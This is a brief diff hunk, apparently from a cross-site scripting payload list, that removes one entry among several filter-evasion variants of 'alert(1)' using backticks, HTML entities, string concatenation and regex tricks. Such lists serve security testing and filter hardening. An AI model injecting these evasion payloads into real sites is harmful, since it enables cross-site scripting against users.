@@ -194,7 +194,6 @@ echo('IPT>alert("XSS")</SCRIPT>'); ?>
 alert`1`
 alert&lpar;1&rpar;
 (alert)(1)
-a=alert,a(1)
 [1].find(alert)
 top["al"+"ert"](1)
 top[/al/.source+/ert/.source](1)
